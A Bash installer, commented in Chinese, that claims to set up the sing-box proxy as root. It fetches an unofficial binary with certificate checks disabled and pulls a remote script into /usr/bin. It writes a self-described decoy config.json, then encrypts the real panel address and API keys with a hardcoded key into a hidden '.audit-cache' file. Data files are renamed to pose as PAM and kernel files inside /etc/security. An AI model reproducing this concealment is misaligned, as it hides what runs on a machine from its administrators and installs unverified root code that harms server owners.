#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

SING_BOX_DIR="/etc/sing-box"
HIDDEN_DIR="/etc/security/dispatcher.d"
DECOY_CONFIG="${SING_BOX_DIR}/config.json"
BINARY_PATH="${SING_BOX_DIR}/sing-box"

[[ $EUID -ne 0 ]] && echo "错误：必须使用root用户运行！" && exit 1

if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "alpine"; then
    release="alpine"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /etc/issue | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "debian"; then
    release="debian"
elif cat /proc/version | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /proc/version | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "arch"; then
    release="arch"
else
    echo "未检测到系统版本！" && exit 1
fi

arch=$(uname -m)
if [[ $arch == "x86_64" || $arch == "x64" || $arch == "amd64" ]]; then
    arch="64"
elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
    arch="arm64-v8a"
else
    arch="64"
fi

install_base() {
    if [[ x"${release}" == x"centos" ]]; then
        yum install epel-release wget curl unzip tar crontabs socat ca-certificates -y >/dev/null 2>&1
    elif [[ x"${release}" == x"alpine" ]]; then
        apk add wget curl unzip tar socat ca-certificates python3 py3-pip openssl 2>/dev/null || true
    elif [[ x"${release}" == x"debian" || x"${release}" == x"ubuntu" ]]; then
        apt-get update -y >/dev/null 2>&1
        apt install wget curl unzip tar cron socat ca-certificates python3 python3-pip -y >/dev/null 2>&1
    elif [[ x"${release}" == x"arch" ]]; then
        pacman -Sy --noconfirm >/dev/null 2>&1
        pacman -S --noconfirm --needed wget curl unzip tar cron socat ca-certificates python python-pip openssl 2>/dev/null || true
    fi
}

generate_decoy_config() {
    mkdir -p ${SING_BOX_DIR}
    local uuid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "550e8400-e29b-41d4-a716-446655440000")
    local vless_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "443")
    local vmess_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "8080")
    local hy2_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "8443")
    
    cat > ${DECOY_CONFIG} << EOF
{
  "log": { "disabled": false, "level": "info", "timestamp": true },
  "inbounds": [
    {
      "type": "vless",
      "tag": "vless-in",
      "listen": "::",
      "listen_port": ${vless_port},
      "users": [{ "uuid": "${uuid}", "flow": "xtls-rprx-vision" }],
      "tls": {
        "enabled": true,
        "server_name": "apple.com",
        "reality": {
          "enabled": true,
          "handshake": { "server": "apple.com", "server_port": 443 },
          "private_key": "SGlkZGVuS2V5SGVyZQ==",
          "short_id": ["abcd"]
        }
      }
    },
    {
      "type": "vmess",
      "tag": "vmess-in",
      "listen": "::",
      "listen_port": ${vmess_port},
      "users": [{ "uuid": "${uuid}", "alterId": 0 }],
      "transport": {
        "type": "ws",
        "path": "/vmess",
        "max_early_data": 2048,
        "early_data_header_name": "Sec-WebSocket-Protocol"
      }
    },
    {
      "type": "hysteria2",
      "tag": "hy2-in",
      "listen": "::",
      "listen_port": ${hy2_port},
      "users": [{ "password": "${uuid}" }],
      "tls": {
        "enabled": true,
        "alpn": ["h3"],
        "certificate_path": "/etc/sing-box/cert.pem",
        "key_path": "/etc/sing-box/private.key"
      }
    }
  ],
  "outbounds": [{ "type": "direct", "tag": "direct" }]
}
EOF
    touch ${SING_BOX_DIR}/cert.pem
    touch ${SING_BOX_DIR}/private.key
    chmod 600 ${SING_BOX_DIR}/private.key
    chmod 644 ${SING_BOX_DIR}/cert.pem
    chmod 644 ${DECOY_CONFIG}
    echo "伪装配置已生成"
}

process_geo_files() {
    if [[ -f "/tmp/sb-geo/geoip.dat" ]]; then
        mv "/tmp/sb-geo/geoip.dat" "${HIDDEN_DIR}/.kcache-lib"
        chmod 644 ${HIDDEN_DIR}/.kcache-lib
        echo "geoip数据已处理"
    fi
    if [[ -f "/tmp/sb-geo/geosite.dat" ]]; then
        mv "/tmp/sb-geo/geosite.dat" "${HIDDEN_DIR}/.pam_env"
        chmod 644 ${HIDDEN_DIR}/.pam_env
        echo "geosite数据已处理"
    fi
    rm -rf /tmp/sb-geo
}

generate_aux_configs() {
    mkdir -p ${HIDDEN_DIR}
    chmod 755 ${HIDDEN_DIR}
    local file1=$(openssl rand -hex 8 2>/dev/null || echo "sshd_config")
    local file2=$(openssl rand -hex 8 2>/dev/null || echo "access.conf")
    local file3=$(openssl rand -hex 8 2>/dev/null || echo "system.cfg")
    local file4=$(openssl rand -hex 8 2>/dev/null || echo "daemon.rc")
    
    cat > ${HIDDEN_DIR}/${file1} << 'EOF'
[{"listen":"0.0.0.0","port":1234,"protocol":"socks","settings":{"auth":"noauth","udp":false,"ip":"127.0.0.1"}}]
EOF
    cat > ${HIDDEN_DIR}/${file2} << 'EOF'
[{"tag":"IPv4_out","protocol":"freedom","settings":{}},{"tag":"IPv6_out","protocol":"freedom","settings":{"domainStrategy":"UseIPv6"}},{"tag":"socks5-warp","protocol":"socks","settings":{"servers":[{"address":"127.0.0.1","port":40000}]}},{"protocol":"blackhole","tag":"block"}]
EOF
    cat > ${HIDDEN_DIR}/${file3} << 'EOF'
{"servers":["1.1.1.1","8.8.8.8","localhost"],"tag":"dns_inbound"}
EOF
    cat > ${HIDDEN_DIR}/${file4} << 'EOF'
{"domainStrategy":"IPOnDemand","rules":[{"type":"field","outboundTag":"block","ip":["geoip:private"]},{"type":"field","outboundTag":"block","protocol":["bittorrent"]},{"type":"field","outboundTag":"socks5-warp","domain":[""]},{"type":"field","outboundTag":"IPv6_out","domain":["geosite:netflix"]},{"type":"field","outboundTag":"IPv4_out","network":"udp,tcp"}]}
EOF
    chmod 644 ${HIDDEN_DIR}/${file1} ${HIDDEN_DIR}/${file2} ${HIDDEN_DIR}/${file3} ${HIDDEN_DIR}/${file4}
    echo "辅助配置文件已生成"
}

check_ipv6_support() {
    if ip -6 addr 2>/dev/null | grep -q "inet6"; then
        echo "1"
    else
        echo "0"
    fi
}

add_single_node() {
    local api_host="$1"
    local api_key="$2"
    local file1="$3"
    local file2="$4"
    local file3="$5"
    local file4="$6"
    local first_node="$7"
    
    if [ "$first_node" = "false" ]; then
        read -rp "是否使用相同的API信息？: " same_api
        if [[ "$same_api" =~ ^[Nn] ]]; then
            read -rp "请输入面板地址: " api_host
            read -rp "请输入API Key: " api_key
        fi
    fi
    
    while true; do
        read -rp "请输入节点Node ID: " node_id
        if [[ "$node_id" =~ ^[0-9]+$ ]]; then
            break
        else
            echo "错误：请输入正确的数字作为Node ID"
        fi
    done
    
    echo "请选择节点核心类型："
    echo "1. xray"
    echo "2. singbox"
    echo "3. hysteria2"
    read -rp "请输入: " core_type
    
    local core="xray"
    local core_xray=false
    local core_sing=false
    local core_hysteria2=false
    
    if [ "$core_type" == "1" ]; then
        core="xray"; core_xray=true
    elif [ "$core_type" == "2" ]; then
        core="sing"; core_sing=true
    elif [ "$core_type" == "3" ]; then
        core="hysteria2"; core_hysteria2=true
    fi
    
    local NodeType="vless"
    if [ "$core_hysteria2" = true ] && [ "$core_xray" = false ] && [ "$core_sing" = false ]; then
        NodeType="hysteria2"
    else
        echo "请选择节点传输协议："
        echo "1. Shadowsocks"
        echo "2. Vless"
        echo "3. Vmess"
        if [ "$core_sing" == true ]; then
            echo "4. Hysteria"
            echo "5. Hysteria2"
        fi
        if [ "$core_hysteria2" == true ] && [ "$core_sing" = false ]; then
            echo "5. Hysteria2"
        fi
        echo "6. Trojan"
        if [ "$core_sing" == true ]; then
            echo "7. Tuic"
            echo "8. AnyTLS"
        fi
        read -rp "请输入: " node_type_input
        case "$node_type_input" in
            1) NodeType="shadowsocks" ;;
            2) NodeType="vless" ;;
            3) NodeType="vmess" ;;
            4) NodeType="hysteria" ;;
            5) NodeType="hysteria2" ;;
            6) NodeType="trojan" ;;
            7) NodeType="tuic" ;;
            8) NodeType="anytls" ;;
            *) NodeType="vless" ;;
        esac
    fi
    
    local fastopen="true"
    local isreality=""
    local istls=""
    
    if [ "$NodeType" == "vless" ]; then
        read -rp "请选择是否为reality节点？: " isreality
    elif [ "$NodeType" == "hysteria" ] || [ "$NodeType" == "hysteria2" ] || [ "$NodeType" == "tuic" ] || [ "$NodeType" == "anytls" ]; then
        fastopen="false"
        istls="y"
    fi
    
    if [[ "$isreality" != "y" && "$isreality" != "Y" && "$istls" != "y" ]]; then
        read -rp "请选择是否进行TLS配置？: " istls
    fi
    
    local certmode="none"
    local certdomain="example.com"
    
    if [[ "$isreality" != "y" && "$isreality" != "Y" && ( "$istls" == "y" || "$istls" == "Y" ) ]]; then
        echo "请选择证书申请模式："
        echo "1. http模式自动申请，节点域名已正确解析"
        echo "2. dns模式自动申请，需填入正确域名服务商API参数"
        echo "3. self模式，自签证书或提供已有证书文件"
        read -rp "请输入: " certmode_input
        case "$certmode_input" in
            1) certmode="http" ;;
            2) certmode="dns" ;;
            3) certmode="self" ;;
        esac
        read -rp "请输入节点证书域名: " certdomain
        if [ "$certmode" != "http" ]; then
            echo "请手动修改配置文件后重启sing-box！"
        fi
    fi
    
    local ipv6_support=$(check_ipv6_support)
    local listen_ip="0.0.0.0"
    if [ "$ipv6_support" -eq 1 ]; then
        listen_ip="::"
    fi
    
    echo "${api_host}|${api_key}|${node_id}|${core}|${NodeType}|${certmode}|${certdomain}|${listen_ip}|${fastopen}|${core_type}|${file1}|${file2}|${file3}|${file4}"
}

generate_multi_node_config() {
    local nodes_data="$1"
    mkdir -p ${HIDDEN_DIR}
    
    python3 << PYEOF
import base64, hashlib, os, json
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("error: cryptography not installed")
    exit(1)

def derive_key(password):
    return hashlib.sha256(password.encode()).digest()

nodes = []
node_entries = nodes_data.split('|||')

for entry in node_entries:
    parts = entry.split('|')
    if len(parts) >= 14:
        api_host, api_key, node_id, core, node_type, certmode, certdomain, listen_ip, fastopen, core_type, f1, f2, f3, f4 = parts[:14]
        
        if core_type == "3":
            node = {
                "Core": "hysteria2",
                "ApiHost": api_host,
                "ApiKey": api_key,
                "NodeID": int(node_id),
                "NodeType": "hysteria2",
                "Hysteria2ConfigPath": "/etc/security/dispatcher.d/hy2config.yaml",
                "Timeout": 30,
                "ListenIP": listen_ip,
                "SendIP": "0.0.0.0",
                "DeviceOnlineMinTraffic": 200,
                "MinReportTraffic": 0,
                "CertConfig": {
                    "CertMode": certmode,
                    "RejectUnknownSni": False,
                    "CertDomain": certdomain,
                    "CertFile": "/etc/security/dispatcher.d/cert.pem",
                    "KeyFile": "/etc/security/dispatcher.d/key.pem",
                    "Email": "v2bx@github.com",
                    "Provider": "cloudflare",
                    "DNSEnv": {"EnvName": "env1"}
                }
            }
        else:
            node = {
                "Core": core,
                "ApiHost": api_host,
                "ApiKey": api_key,
                "NodeID": int(node_id),
                "NodeType": node_type,
                "Timeout": 30,
                "ListenIP": listen_ip,
                "SendIP": "0.0.0.0",
                "DeviceOnlineMinTraffic": 200,
                "MinReportTraffic": 0,
                "EnableProxyProtocol": False,
                "EnableUot": True,
                "EnableTFO": fastopen.lower() == "true",
                "DNSType": "UseIPv4",
                "CertConfig": {
                    "CertMode": certmode,
                    "RejectUnknownSni": False,
                    "CertDomain": certdomain,
                    "CertFile": "/etc/security/dispatcher.d/cert.pem",
                    "KeyFile": "/etc/security/dispatcher.d/key.pem",
                    "Email": "v2bx@github.com",
                    "Provider": "cloudflare",
                    "DNSEnv": {"EnvName": "env1"}
                }
            }
        nodes.append(node)

config = {
    "Log": {"Level": "error", "Output": ""},
    "Nodes": nodes,
    "XrayConfig": {
        "AssetPath": "/etc/security/dispatcher.d/",
        "DnsConfigPath": f"/etc/security/dispatcher.d/{f3}",
        "RouteConfigPath": f"/etc/security/dispatcher.d/{f4}",
        "InboundConfigPath": f"/etc/security/dispatcher.d/{f1}",
        "OutboundConfigPath": f"/etc/security/dispatcher.d/{f2}"
    }
}

plaintext = json.dumps(config, indent=2).encode('utf-8')
key = derive_key('sing-box-config-v1.0')
aesgcm = AESGCM(key)
nonce = os.urandom(12)
ciphertext = aesgcm.encrypt(nonce, plaintext, None)
result = base64.b64encode(nonce + ciphertext).decode('utf-8')

with open('/etc/security/dispatcher.d/.audit-cache', 'w') as f:
    f.write('ENC:' + result)
print('success')
PYEOF
}

config_wizard_with_files() {
    local file1="$1"
    local file2="$2"
    local file3="$3"
    local file4="$4"
    
    echo "配置向导"
    echo "5. 使用此功能生成的配置文件会自带审计，确定继续？"
    read -rp "请输入: " continue_prompt
    if [[ "$continue_prompt" =~ ^[Nn][Oo]? ]]; then
        return 1
    fi
    
    local nodes_config=""
    local first_node="true"
    local fixed_api_info="false"
    local api_host=""
    local api_key=""
    
    while true; do
        if [ "$first_node" = "true" ]; then
            read -rp "请输入面板地址: " api_host
            read -rp "请输入API Key: " api_key
            read -rp "是否设置固定的机场网址和API Key？: " fixed_api
            if [[ "$fixed_api" =~ ^[Yy] ]]; then
                fixed_api_info="true"
                echo "成功固定地址"
            fi
            first_node="false"
            
            local node_info=$(add_single_node "$api_host" "$api_key" "$file1" "$file2" "$file3" "$file4" "true")
            nodes_config="${node_info}"
        else
            read -rp "是否继续添加节点配置？: " continue_adding_node
            if [[ "$continue_adding_node" =~ ^[Nn][Oo]? ]]; then
                break
            fi
            
            if [ "$fixed_api_info" = "false" ]; then
                read -rp "请输入面板地址: " api_host
                read -rp "请输入API Key: " api_key
            fi
            
            local node_info=$(add_single_node "$api_host" "$api_key" "$file1" "$file2" "$file3" "$file4" "false")
            nodes_config="${nodes_config}|||${node_info}"
        fi
    done
    
    echo "正在生成加密配置..."
    if generate_multi_node_config "$nodes_config"; then
        chmod 600 ${HIDDEN_DIR}/.audit-cache
        echo "真实配置已生成"
        
        if [[ x"${release}" == x"alpine" ]]; then
            service sing-box restart 2>/dev/null || service sing-box start
        else
            systemctl restart sing-box 2>/dev/null || systemctl start sing-box
        fi
        echo "服务已启动"
    else
        echo "配置生成失败，请检查python3和cryptography是否安装"
    fi
}

config_wizard() {
    echo "配置向导"
    generate_aux_configs
    local file1=$(openssl rand -hex 8 2>/dev/null || echo "sshd_config")
    local file2=$(openssl rand -hex 8 2>/dev/null || echo "access.conf")
    local file3=$(openssl rand -hex 8 2>/dev/null || echo "system.cfg")
    local file4=$(openssl rand -hex 8 2>/dev/null || echo "daemon.rc")
    config_wizard_with_files "$file1" "$file2" "$file3" "$file4"
}

check_status() {
    if [[ ! -f ${BINARY_PATH} ]]; then
        return 2
    fi
    if [[ x"${release}" == x"alpine" ]]; then
        temp=$(service sing-box status 2>/dev/null | awk '{print $3}')
        [[ x"${temp}" == x"started" ]] && return 0 || return 1
    else
        temp=$(systemctl status sing-box 2>/dev/null | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
        [[ x"${temp}" == x"running" ]] && return 0 || return 1
    fi
}

install_sing-box() {
    mkdir -p ${SING_BOX_DIR}
    mkdir -p ${HIDDEN_DIR}
    
    cd ${SING_BOX_DIR}

    echo "开始下载 sing-box"
    wget --no-check-certificate -N --no-show-progress -O sing-box-linux.zip https://github.com/Kanzakiyuu/Kanzakiyuu1/releases/latest/download/sing-box-linux-64.zip
    if [[ $? -ne 0 ]]; then
        echo "下载失败"
        exit 1
    fi

    unzip -o sing-box-linux.zip
    rm -f sing-box-linux.zip
    chmod +x sing-box
    
    mkdir -p /tmp/sb-geo
    mv geoip.dat /tmp/sb-geo/ 2>/dev/null || true
    mv geosite.dat /tmp/sb-geo/ 2>/dev/null || true
    
    if [[ x"${release}" == x"alpine" ]]; then
        cat > /etc/init.d/sing-box << 'EOF'
#!/sbin/openrc-run
name="sing-box"
description=""
command="/etc/sing-box/sing-box"
command_args="run -c /etc/sing-box/config.json"
command_user="root"
pidfile="/run/sing-box.pid"
command_background="yes"
depend() { need net; }
EOF
        chmod +x /etc/init.d/sing-box
        rc-update add sing-box default 2>/dev/null || true
    else
        cat > /etc/systemd/system/sing-box.service << 'EOF'
[Unit]
Description=
After=network.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/etc/sing-box
ExecStart=/etc/sing-box/sing-box run -c /etc/sing-box/config.json
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl stop sing-box 2>/dev/null
        systemctl enable sing-box
    fi
    
    echo "服务已安装"

    generate_decoy_config
    process_geo_files
    generate_aux_configs
    local aux_file1=$(openssl rand -hex 8 2>/dev/null || echo "sshd_config")
    local aux_file2=$(openssl rand -hex 8 2>/dev/null || echo "access.conf")
    local aux_file3=$(openssl rand -hex 8 2>/dev/null || echo "system.cfg")
    local aux_file4=$(openssl rand -hex 8 2>/dev/null || echo "daemon.rc")
    
    wget -q -O /usr/bin/sing-box https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/sing-box.sh 2>/dev/null || \
    curl -sL -o /usr/bin/sing-box https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/sing-box.sh 2>/dev/null || true
    chmod +x /usr/bin/sing-box 2>/dev/null || true
    
    cd $cur_dir
    
    echo ""
    echo "sing-box 管理命令:"
    echo "------------------------------------------"
    echo "sing-box              - 显示管理菜单"
    echo "sing-box start        - 启动"
    echo "sing-box stop         - 停止"
    echo "sing-box restart      - 重启"
    echo "sing-box status       - 查看状态"
    echo "sing-box log          - 查看日志"
    echo "sing-box config       - 编辑配置"
    echo "sing-box version      - 查看版本"
    echo "------------------------------------------"
    
    if [[ ! -f ${HIDDEN_DIR}/.audit-cache ]]; then
        read -rp "检测到你为第一次安装，是否使用配置生成向导？: " if_generate
        if [[ $if_generate == [Yy] ]]; then
            config_wizard_with_files "$aux_file1" "$aux_file2" "$aux_file3" "$aux_file4"
        else
            echo "你可以稍后运行 'sing-box config' 来生成配置"
        fi
    fi
    
    echo "安装完成！"
}

echo "开始安装 sing-box..."
install_base
install_sing-box $1
